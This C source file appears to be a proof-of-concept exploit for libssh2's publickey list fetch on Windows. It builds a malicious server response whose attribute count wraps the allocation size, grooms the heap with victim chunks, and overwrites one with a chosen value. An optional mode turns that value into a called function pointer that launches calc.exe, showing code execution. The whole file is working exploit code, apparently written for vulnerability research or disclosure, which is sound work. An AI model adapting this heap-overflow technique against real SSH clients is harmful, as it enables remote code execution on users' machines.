#include <winsock2.h>
#include <windows.h>
#include <malloc.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "libssh2_priv.h"
#include "libssh2_publickey.h"
#include "channel.h"

#define PAIRS 4096
#define VICTIM_SIZE 4
#define DEFAULT_MARKER_VALUE 0x41424344UL
#define DEFAULT_TARGET_INDEX (PAIRS - 8)

static unsigned char wire[4096];
static size_t wire_len;
static size_t wire_off;
static void *small_chunks[PAIRS];
static void *fillers[PAIRS][3];
static unsigned char *victims[PAIRS];
static void *attrs_ptr;
static size_t attrs_msize;
static int terminal_attr = 0;
static char terminal_field = 'n';
static uint32_t marker_value = DEFAULT_MARKER_VALUE;
static int call_mode;
static int target_index = DEFAULT_TARGET_INDEX;
static int private_heap_mode;
static HANDLE proof_heap;

static void reached_marker(void)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char cmd[] = "calc.exe";
    FILE *f = fopen("x86_calc_payload_reached.txt", "wb");

    if(f) {
        fputs("x86 calc payload reached\n", f);
        fclose(f);
    }

    fprintf(stderr, "marker_function_reached address=%p\n", reached_marker);
    memset(&si, 0, sizeof(si));
    memset(&pi, 0, sizeof(pi));
    si.cb = sizeof(si);
    if(CreateProcessA(NULL, cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si,
                      &pi)) {
        fprintf(stderr, "calc_launch=success pid=%lu\n",
                (unsigned long)pi.dwProcessId);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    else {
        fprintf(stderr, "calc_launch=failed error=%lu\n",
                (unsigned long)GetLastError());
        ExitProcess(78);
    }
    ExitProcess(77);
}

static void *proof_malloc(size_t size)
{
    if(private_heap_mode)
        return HeapAlloc(proof_heap, 0, size ? size : 1);
    return malloc(size ? size : 1);
}

static void *proof_calloc(size_t size)
{
    void *ptr = proof_malloc(size);
    if(ptr)
        memset(ptr, 0, size);
    return ptr;
}

static void proof_free(void *ptr)
{
    if(private_heap_mode)
        HeapFree(proof_heap, 0, ptr);
    else
        free(ptr);
}

static void *proof_realloc(void *ptr, size_t size)
{
    if(!ptr)
        return proof_malloc(size);
    if(private_heap_mode)
        return HeapReAlloc(proof_heap, 0, ptr, size ? size : 1);
    return realloc(ptr, size ? size : 1);
}

static size_t proof_msize(void *ptr)
{
    if(private_heap_mode) {
        SIZE_T size = HeapSize(proof_heap, 0, ptr);
        return size == (SIZE_T)-1 ? 0 : (size_t)size;
    }
    return _msize(ptr);
}

static LIBSSH2_ALLOC_FUNC(heap_alloc)
{
    void *ptr;

    (void)abstract;
    if(count == 4)
        ptr = proof_malloc(count);
    else
        ptr = proof_calloc(count);
    if(count == 4) {
        attrs_ptr = ptr;
        attrs_msize = ptr ? proof_msize(ptr) : 0;
        fprintf(stderr, "attrs_alloc requested=%lu ptr=%p msize=%lu\n",
                (unsigned long)count, ptr, (unsigned long)attrs_msize);
    }
    return ptr;
}

static LIBSSH2_FREE_FUNC(heap_free)
{
    (void)abstract;
    if(ptr == attrs_ptr)
        return;
    proof_free(ptr);
}

static LIBSSH2_REALLOC_FUNC(heap_realloc)
{
    void *newptr;

    (void)abstract;
    if(!ptr)
        return heap_alloc(count, abstract);
    newptr = proof_realloc(ptr, count);
    return newptr;
}

int ssh2_err(LIBSSH2_SESSION *session, int errcode, const char *errmsg)
{
    if(session) {
        session->err_code = errcode;
        session->err_msg = (char *)errmsg;
    }
    return errcode;
}

int ssh2_err_flags(LIBSSH2_SESSION *session, int errcode, const char *errmsg,
                   int errflags)
{
    (void)errflags;
    return ssh2_err(session, errcode, errmsg);
}

uint32_t ssh2_ntohu32(const unsigned char *buf)
{
    return ((uint32_t)buf[0] << 24) | ((uint32_t)buf[1] << 16) |
        ((uint32_t)buf[2] << 8) | (uint32_t)buf[3];
}

void ssh2_htonu32(unsigned char *buf, uint32_t value)
{
    buf[0] = (unsigned char)(value >> 24);
    buf[1] = (unsigned char)(value >> 16);
    buf[2] = (unsigned char)(value >> 8);
    buf[3] = (unsigned char)value;
}

void ssh2_store_u32(unsigned char **buf, uint32_t value)
{
    ssh2_htonu32(*buf, value);
    *buf += 4;
}

int ssh2_store_str(unsigned char **buf, const char *str, size_t len)
{
    ssh2_store_u32(buf, (uint32_t)len);
    memcpy(*buf, str, len);
    *buf += len;
    return 0;
}

ssize_t ssh2_channel_write(LIBSSH2_CHANNEL *channel, int stream_id,
                           const unsigned char *buf, size_t buflen)
{
    (void)channel;
    (void)stream_id;
    (void)buf;
    return (ssize_t)buflen;
}

ssize_t ssh2_channel_read(LIBSSH2_CHANNEL *channel, int stream_id,
                          char *buf, size_t buflen)
{
    (void)channel;
    (void)stream_id;
    if(wire_off + buflen > wire_len)
        return -1;
    memcpy(buf, wire + wire_off, buflen);
    wire_off += buflen;
    return (ssize_t)buflen;
}

int ssh2_channel_free(LIBSSH2_CHANNEL *channel)
{
    (void)channel;
    return 0;
}

int ssh2_channel_close(LIBSSH2_CHANNEL *channel)
{
    (void)channel;
    return 0;
}

int libssh2_session_last_errno(LIBSSH2_SESSION *session)
{
    return session ? session->err_code : 0;
}

int ssh2_wait_socket(LIBSSH2_SESSION *session, time_t start_time)
{
    (void)session;
    (void)start_time;
    return 0;
}

LIBSSH2_CHANNEL *ssh2_channel_open(LIBSSH2_SESSION *session,
                                   const char *channel_type,
                                   uint32_t channel_type_len,
                                   uint32_t window_size,
                                   uint32_t packet_size,
                                   const unsigned char *message,
                                   size_t message_len)
{
    (void)session;
    (void)channel_type;
    (void)channel_type_len;
    (void)window_size;
    (void)packet_size;
    (void)message;
    (void)message_len;
    return NULL;
}

int ssh2_channel_process_startup(LIBSSH2_CHANNEL *channel,
                                 const char *request, size_t request_len,
                                 const char *message, size_t message_len)
{
    (void)channel;
    (void)request;
    (void)request_len;
    (void)message;
    (void)message_len;
    return LIBSSH2_ERROR_SOCKET_NONE;
}

int ssh2_channel_extended_data(LIBSSH2_CHANNEL *channel, int ignore_mode)
{
    (void)channel;
    (void)ignore_mode;
    return 0;
}

void *ssh2_calloc(LIBSSH2_SESSION *session, size_t size)
{
    void *ptr = heap_alloc(size, session ? session->abstract : NULL);
    if(ptr)
        memset(ptr, 0, size);
    return ptr;
}

static unsigned char *put_string(unsigned char *p, const char *s)
{
    size_t len = strlen(s);
    ssh2_store_u32(&p, (uint32_t)len);
    memcpy(p, s, len);
    return p + len;
}

static unsigned char *put_response(unsigned char *w, unsigned char *payload,
                                   size_t payload_len)
{
    ssh2_htonu32(w, (uint32_t)payload_len);
    memcpy(w + 4, payload, payload_len);
    return w + 4 + payload_len;
}

static void build_attr_spray_response(void)
{
    unsigned char payload[3072];
    unsigned char status[64];
    unsigned char *p = payload;
    unsigned char *s = status;
    unsigned char *w = wire;
    uint32_t attr_size = (uint32_t)sizeof(libssh2_publickey_attribute);
    uint32_t num_attrs = (uint32_t)((0x100000000ULL / attr_size) + 1);
    int i;

    p = put_string(p, "publickey");
    p = put_string(p, "n");
    p = put_string(p, "b");
    ssh2_store_u32(&p, num_attrs);
    for(i = 0; i < 80; i++) {
        if(i == terminal_attr && terminal_field == 'n') {
            ssh2_store_u32(&p, marker_value);
            break;
        }
        else
            ssh2_store_u32(&p, 0);
        if(i == terminal_attr && terminal_field == 'v') {
            ssh2_store_u32(&p, marker_value);
            break;
        }
        else
            ssh2_store_u32(&p, 0);
    }
    w = put_response(w, payload, (size_t)(p - payload));

    s = put_string(s, "status");
    ssh2_store_u32(&s, 0);
    ssh2_store_u32(&s, 0);
    ssh2_store_u32(&s, 0);
    w = put_response(w, status, (size_t)(s - status));

    wire_len = (size_t)(w - wire);
    fprintf(stderr, "attr_size=%lu num_attrs=0x%08lx wrapped=%lu wire=%lu\n",
            (unsigned long)attr_size, (unsigned long)num_attrs,
            (unsigned long)(num_attrs * attr_size),
            (unsigned long)wire_len);
}

static void groom_heap(void)
{
    int i;

    for(i = 0; i < PAIRS; i++) {
        small_chunks[i] = proof_malloc(4);
        fillers[i][0] = proof_malloc(4);
        fillers[i][1] = proof_malloc(4);
        fillers[i][2] = proof_malloc(4);
        victims[i] = proof_malloc(VICTIM_SIZE);
        memset(victims[i], 0x45, VICTIM_SIZE);
        *(uint32_t *)(victims[i] + 0) = 0xfeedfaceUL;
    }
    if(target_index < 0 || target_index >= PAIRS)
        target_index = DEFAULT_TARGET_INDEX;
    free(small_chunks[target_index]);
    fprintf(stderr, "target_index=%d freed_small=%p victim=%p expected_delta=%ld\n",
            target_index, small_chunks[target_index], victims[target_index],
            (long)(victims[target_index] -
                   (unsigned char *)small_chunks[target_index]));
}

static int scan_victims(void)
{
    int i;
    int hits = 0;
    int marker_hits = 0;

    for(i = 0; i < PAIRS; i++) {
        int changed = 0;
        if(*(uint32_t *)(victims[i] + 0) != 0xfeedfaceUL)
            changed = 1;
        if(changed) {
            intptr_t delta = attrs_ptr ?
                (intptr_t)(victims[i] - (unsigned char *)attrs_ptr) : 0;
            fprintf(stderr, "victim[%d]=%p delta=%ld word=%08lx\n",
                    i, victims[i], (long)delta,
                    (unsigned long)*(uint32_t *)(victims[i] + 0));
            if(*(uint32_t *)(victims[i] + 0) == marker_value) {
                marker_hits++;
                if(call_mode) {
                    void (*fn)(void) =
                        (void (*)(void))(*(uintptr_t *)(victims[i] + 0));
                    fn();
                }
            }
            hits++;
            if(hits >= 8)
                break;
        }
    }
    fprintf(stderr, "marker_hits=%d\n", marker_hits);
    return marker_hits;
}

int main(int argc, char **argv)
{
    LIBSSH2_SESSION session;
    LIBSSH2_CHANNEL channel;
    LIBSSH2_PUBLICKEY pkey;
    libssh2_publickey_list *list = NULL;
    unsigned long num_keys = 0;
    int rc;
    int hits;

    if(argc > 1)
        terminal_attr = atoi(argv[1]);
    if(argc > 2 && argv[2][0])
        terminal_field = argv[2][0];
    {
        int argi;
        for(argi = 3; argi < argc; argi++) {
            if(!strcmp(argv[argi], "call")) {
                call_mode = 1;
                marker_value = (uint32_t)(uintptr_t)reached_marker;
            }
            else if(!strcmp(argv[argi], "private"))
                private_heap_mode = 1;
            else
                target_index = atoi(argv[argi]);
        }
    }

    if(private_heap_mode) {
        proof_heap = HeapCreate(0, 0, 0);
        if(!proof_heap)
            return 2;
    }

    fprintf(stderr, "terminal_attr=%d terminal_field=%c marker=0x%08lx target_index=%d heap=%s\n",
            terminal_attr, terminal_field, (unsigned long)marker_value,
            target_index, private_heap_mode ? "private" : "crt");

    memset(&session, 0, sizeof(session));
    memset(&channel, 0, sizeof(channel));
    memset(&pkey, 0, sizeof(pkey));

    session.alloc = heap_alloc;
    session.free = heap_free;
    session.realloc = heap_realloc;
    channel.session = &session;
    pkey.channel = &channel;
    pkey.version = 2;

    groom_heap();
    build_attr_spray_response();
    rc = libssh2_publickey_list_fetch(&pkey, &num_keys, &list);
    hits = scan_victims();
    fprintf(stderr, "return rc=%d num_keys=%lu list=%p hits=%d attrs_ptr=%p msize=%lu\n",
            rc, num_keys, list, hits, attrs_ptr, (unsigned long)attrs_msize);
    return hits ? 77 : 1;
}
